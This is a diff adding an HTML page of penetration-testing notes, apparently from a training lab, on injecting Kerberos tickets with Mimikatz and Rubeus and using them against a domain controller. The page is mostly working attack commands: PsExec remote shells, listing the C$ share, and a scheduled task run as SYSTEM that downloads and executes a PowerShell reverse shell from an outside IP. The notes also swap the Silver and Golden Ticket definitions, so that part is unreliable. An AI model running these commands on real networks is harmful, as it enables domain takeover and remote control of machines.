@@ -1,0 +1,18 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>from Windows</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Using Kerberos Tickets - from Windows</h1></strong><br />The general premise is Inject ticket -&gt; use ticket.<br /><br /><code>klist</code> - list tickets<br /><br /><strong><h2>## Inject Ticket</h2></strong><br />There are multiple tools to do this.<br /><br /><strong><h3>### Mimikatz</h3></strong><br /><code>kerberos::ptt &lt;ticket_kirbi_file&gt;</code><br /><br /><strong><h3>### Rubeus</h3></strong><br /><code>.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;</code><br />inject from base64 blob<br /><code>.\Rubeus.exe ptt /ticket:BASE64BLOBHERE</code><br /><br /><strong><h2>## Use ticket</h2></strong><br />What you can do depends on what ticket you have.<br />• Silver Ticket - TGT - can request access to any service. this should be your goal to grab<br />• Golden Ticket - TGS - have access to a specific service<br /><br />Different SPNs give you access to different stuff<br /><table class="table"><tr><th>Computer Account Service</th><th>SPN</th></tr><tr><td>WMI</td><td>HOST
+RPCSS</td></tr><tr><td>PowerShell Remoting</td><td>HOST
+HTTP
+Depending on OS version may also need: WSMAN &amp; RPCSS</td></tr><tr><td>WinRM</td><td>HOST
+HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>LDAP operations including Mimikatz DCSync</td><td>LDAP</td></tr><tr><td>Windows Remote Server Administration Tools</td><td>RPCSS
+LDAP
+CIFS</td></tr></table><br /><br /><strong><h3>### CIFS</h3></strong><br /><code>dir \\domain-controller.dollarcorp.moneycorp.local\C$</code><br /><br /><strong><h3>### HOST</h3></strong><br /><div class="codebox"><div class="codebox">#&nbsp;PsExec<br />#&nbsp;-------------------------------------------<br />#&nbsp;Execute&nbsp;a&nbsp;remote&nbsp;command&nbsp;/&nbsp;get&nbsp;cmd&nbsp;shell<br />.\PsExec.exe&nbsp;-accepteula&nbsp;\\&lt;remote_hostname&gt;&nbsp;cmd<br /><br />#&nbsp;schtask&nbsp;-&nbsp;execute&nbsp;command<br />#&nbsp;-------------------------------------------<br />#&nbsp;1.&nbsp;List&nbsp;tasks&nbsp;to&nbsp;test&nbsp;that&nbsp;Silver&nbsp;Ticket&nbsp;works<br />schtasks&nbsp;/S&nbsp;domain-controller.dollarcorp.moneycorp.local<br /><br />#&nbsp;2.&nbsp;Schedule&nbsp;a&nbsp;task&nbsp;on&nbsp;the&nbsp;domain&nbsp;controller<br />schtasks&nbsp;/create&nbsp;/S&nbsp;domain-controller.dollarcorp.monoeycorp.local&nbsp;/SC&nbsp;Weekly&nbsp;/RU&nbsp;&quot;NT&nbsp;Authority\SYSTEM&quot;&nbsp;/TN&nbsp;&quot;STCheck&quot;&nbsp;/TR&nbsp;&quot;powershell.exe&nbsp;-c&nbsp;&#39;iex&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString(&#39;&#39;http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1&#39;&#39;)&#39;&quot;<br /><br />#&nbsp;3.&nbsp;Execute&nbsp;task<br />schtasks&nbsp;/Run&nbsp;/S&nbsp;domain-controller.dollarcorp.moneycorp.local&nbsp;/TN&nbsp;&quot;STCheck&quot;</div></div><br /></div>
+</body>
+</html>
